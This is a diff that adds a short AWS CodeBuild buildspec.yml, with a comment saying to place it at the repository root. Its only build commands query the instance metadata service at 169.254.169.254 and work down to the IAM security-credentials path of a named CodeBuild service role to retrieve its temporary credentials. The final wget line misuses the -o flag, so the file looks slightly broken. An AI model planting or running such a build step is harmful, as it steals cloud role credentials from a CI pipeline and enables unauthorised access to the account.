@@ -1,0 +1,11 @@
+#### Place this buildspec.yml at the root of the repository
+###@@@@
+version: 0.1
+phases:
+  build:
+    commands:
+	- wget --spider http://169.254.169.254/latest/meta-data/ 
+	- wget --spider http://169.254.169.254/latest/meta-data/iam/
+	- wget --spider http://169.254.169.254/latest/meta-data/iam/security-credentials/code-build-makeami-project-service-role
+	- wget -o http://169.254.169.254/latest/meta-data/iam/security-credentials/code-build-makeami-project-service-role
+	
